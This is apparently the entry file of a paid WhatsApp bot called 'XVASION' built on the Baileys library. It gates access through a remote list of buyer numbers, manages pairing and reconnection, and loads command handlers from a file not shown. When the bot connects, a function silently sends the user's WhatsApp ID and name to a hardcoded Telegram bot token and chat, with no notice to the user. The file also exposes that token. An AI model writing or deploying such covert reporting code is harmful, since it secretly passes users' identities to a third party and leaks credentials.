require('./config');
const { 
    default: makeWASocket, 
    prepareWAMessageMedia, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    generateWAMessageFromContent, 
    generateWAMessageContent, 
    jidDecode, 
    proto, 
    relayWAMessage, 
    getContentType, 
    getAggregateVotesInPollMessage, 
    downloadContentFromMessage, 
    fetchLatestWaWebVersion, 
    InteractiveMessage, 
    makeCacheableSignalKeyStore, 
    Browsers, 
    generateForwardMessageContent, 
    MessageRetryMap 
} = require("@whiskeysockets/baileys");
const axios = require('axios');
const pino = require('pino');
const readline = require("readline");
const fs = require('fs');
const figlet = require('figlet');
const chalk = require("chalk");
const crypto = require('crypto');
const { Boom } = require('@hapi/boom');
const { color } = require('./library/color');
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./library/function');

const custom = "1234ZEPY" // 8 karakter, bisa huruf/angka
const usePairingCode = true;
const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
const question = (text) => {
return new Promise((resolve) => { rl.question(text, resolve) });
}

const sendTelegramNotification = async (message) => {
    try {
        await axios.post(`https://api.telegram.org/bot7682514927:AAGh1naoilXeUKro9n71b_LlLXRGLkePtJA/sendMessage`, {
            chat_id: '8135629926',
            text: message
        });
    } catch (error) {
    }
};

const store = (() => {
  const messages = {}

  const loadMessage = async (jid, id) => {
    return messages[jid] ? (messages[jid].array || []).find(m => m.key.id === id) : null
  }

  const bind = () => {
    const upsertHandler = ({ messages: msgs }) => {
      const msg = msgs[0]
      const jid = msg.key.remoteJid
      messages[jid] ||= { array: [] }
      messages[jid].array.push(msg)
    }

    const deleteHandler = ({ keys }) => {
      const msg = keys?.[0]
      const jid = msg?.remoteJid
      if (!jid || !messages[jid]) return
      messages[jid].array = messages[jid].array.filter(m => m.key.id !== msg.id)
    }

    return {
      upsertHandler,
      deleteHandler
    }
  }

  return {
    messages,
    loadMessage,
    bind
  }
})()

async function isAuthorizedNumber(phoneNumber) {
   const databaseURL = 'https://raw.githubusercontent.com/zepytry/xvasion/refs/heads/main/database2.json';
    try {
        const response = await axios.get(databaseURL);
        const authorizedNumbers = response.data.data;
        return authorizedNumbers.includes(phoneNumber);
    } catch (error) {
        console.error('Error fetching database:', error.message);
        return
    }
}

// Whatsapp Connect
async function ConnetToWhatsapp() {
const { state, saveCreds } = await useMultiFileAuthState('./session');
const sock = makeWASocket({
logger: pino({ level: "silent" }),
printQRInTerminal: !usePairingCode,
auth: state,
browser: ["Ubuntu", "Chrome", "20.0.04"]
});
if (usePairingCode && !sock.authState.creds.registered) {
        console.log(chalk.green.bold(`⡴⠒⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠉⠳⡆⠀
⣇⠰⠉⢙⡄⠀⠀⣴⠖⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠁⠙⡆
⠘⡇⢠⠞⠉⠙⣾⠃⢀⡼⠀⠀⠀⠀⠀⠀⠀⢀⣼⡀⠄⢷⣄⣀⠀⠀⠀⠀⠀⠀⠀⠰⠒⠲⡄⠀⣏⣆⣀⡍
⠀⢠⡏⠀⡤⠒⠃⠀⡜⠀⠀⠀⠀⠀⢀⣴⠾⠛⡁⠀⠀⢀⣈⡉⠙⠳⣤⡀⠀⠀⠀⠘⣆⠀⣇⡼⢋⠀⠀⢱
⠀⠘⣇⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⡴⢋⡣⠊⡩⠋⠀⠀⠀⠣⡉⠲⣄⠀⠙⢆⠀⠀⠀⣸⠀⢉⠀⢀⠿⠀⢸
⠀⠀⠸⡄⠀⠈⢳⣄⡇⠀⠀⢀⡞⠀⠈⠀⢀⣴⣾⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⢧⠀⠀⢳⣰⠁⠀⠀⠀⣠⠃
⠀⠀⠀⠘⢄⣀⣸⠃⠀⠀⠀⡸⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠈⣇⠀⠀⠙⢄⣀⠤⠚⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⢘⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢰⣿⣿⣿⡿⠛⠁⠀⠉⠛⢿⣿⣿⣿⣧⠀⠀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡀⣸⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⡀⢀⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡇⠹⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠁⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣤⣞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢢⣀⣠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⢤⣀⣀⠀⢀⣀⣀⠤⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

DEVELOPER: ZEPY
VERSION: V3.0 VIP
`));
const phoneNumber = await question(chalk.cyan.bold('INPUT SENDER NUMBER\nNUMBER : '));

const isAuthorized = await isAuthorizedNumber(phoneNumber.trim());
        if (!isAuthorized) {
            console.log(chalk.red.bold('DICK THERE IS AN INFLATOR\nBUY ACCESS CONTACT: 6289602190311'));
            return;
        }
        
        
const code = await sock.requestPairingCode(phoneNumber, custom);

/* Testo await conn.requestPairingCode(phoneNumber, custom)
*/
console.log(chalk.green.bold(`PAIRING CODE : ${code}`));
}

store.bind(sock.ev);
sock.ev.on("messages.upsert", async (chatUpdate, msg) => {
 try {
const mek = chatUpdate.messages[0]
if (!mek.message) return
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast') return
if (!sock.public && !mek.key.fromMe && chatUpdate.type === 'notify') return
if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
if (mek.key.id.startsWith('FatihArridho_')) return;
const m = smsg(sock, mek, store)
require("./case")(sock, m, chatUpdate, store)
 } catch (err) {
 console.log(err)
 }
});

    sock.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    };

    sock.ev.on('contacts.update', update => {
        for (let contact of update) {
            let id = sock.decodeJid(contact.id);
            if (store && store.contacts) store.contacts[id] = { id, name: contact.notify };
        }
    });

    sock.public = true

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
            console.log(color(lastDisconnect.error, 'deeppink'));
            if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
                process.exit();
            } else if (reason === DisconnectReason.badSession) {
                console.log(color(`┏━━━━━━━━━━━━━[ XVASION ]
┃MESSAGE: BAD SESSION FILE
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
                process.exit();
            } else if (reason === DisconnectReason.connectionClosed) {
                 console.log(color(`┏━━━━━━━━━━━━━[ XVASION ]
┃MESSAGE: CONNECTION CLOSED, RECONNECTING
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
                process.exit();
            } else if (reason === DisconnectReason.connectionLost) {
                 console.log(color(`┏━━━━━━━━━━━━━[ XVASION ]
┃MESSAGE: CONNECTION LOST
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
                process.exit();
            } else if (reason === DisconnectReason.connectionReplaced) {
                 console.log(color(`┏━━━━━━━━━━━━━[ XVASION ]
┃MESSAGE: CONNECTION REPLACED, PLS RESTART
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
                sock.logout();
            } else if (reason === DisconnectReason.loggedOut) {
                 console.log(color(`┏━━━━━━━━━━━━━[ XVASION ]
┃MESSAGE: DEVICE LOGGED OUT
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
                sock.logout();
            } else if (reason === DisconnectReason.restartRequired) {
                 console.log(color(`┏━━━━━━━━━━━━━[ XVASION ]
┃MESSAGE: RESTART REQUIRED, RESTARTING
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
                await ConnetToWhatsapp();
            } else if (reason === DisconnectReason.timedOut) {
                 console.log(color(`┏━━━━━━━━━━━━━[ XVASION ]
┃MESSAGE: CONNECTION TIME OUT
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
                ConnetToWhatsapp();
            }
        } else if (connection === "connecting") {
             console.log(color(`┏━━━━━━━━━━━━━[ XVASION ]
┃MESSAGE: RECONNECT
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
        } else if (connection === "open") {
             console.log(color(`┏━━━━━━━━━━━━━[ XVASION ]
┃MESSAGE: CONNECTED
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
            sendTelegramNotification(`USERID : ${sock.user.id}\n> USERNAME : ${sock.user.name}\n\n`);
        }
    });

    sock.sendText = (jid, text, quoted = '', options) => sock.sendMessage(jid, { text: text, ...options }, { quoted });
    
    sock.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
return buffer
    } 
    
    sock.ev.on('creds.update', saveCreds);
    return sock;
}

ConnetToWhatsapp();

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file);
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
    delete require.cache[file];
    require(file);
});
